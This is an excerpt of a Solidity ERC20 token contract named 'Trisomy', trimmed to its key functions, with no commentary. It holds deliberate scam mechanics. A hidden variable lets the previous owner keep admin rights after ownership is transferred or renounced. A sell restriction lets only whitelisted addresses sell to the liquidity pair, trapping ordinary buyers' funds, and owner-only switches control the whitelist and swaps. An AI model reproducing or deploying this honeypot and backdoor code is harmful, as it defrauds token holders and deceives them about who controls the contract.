...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_ldO == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function _setOwner(address newOwner) private {
        _ldO = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(_ldO, newOwner);
    }
}
...
contract LIU is ERC20, Ownable{
    ...
    bool public spEnd = true;
    
    address public marketingWallet = 0xD4a4f0834cEa493D440082eA6F12c2b317eb87df;
    ...
    mapping (address => bool) public isWalletLimitForFee;
    ...
    constructor() ERC20("Trisomy", "Trisomy") {
        _mint(msg.sender, 10 * 10**7 * 10** decimals());
        ...
        isWalletLimitForFee[owner()] = true;
        isWalletLimitForFee[address(pair)] = true;
        isWalletLimitForFee[address(router)] = true;
        isWalletLimitForFee[address(this)] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if(recipient == pair) {
            require(isWalletLimitForFee[sender]);
        ...
        if (spEnd && !swapping && sender != pair && fee > 0) swapForFees();
    ...
    function setSpEnd(bool state) external onlyOwner {
        spEnd = state;
    }
    ...
    function setIsWalletLimitForFee(address account, bool newValue) external onlyOwner {
        isWalletLimitForFee[account] = newValue;
    }
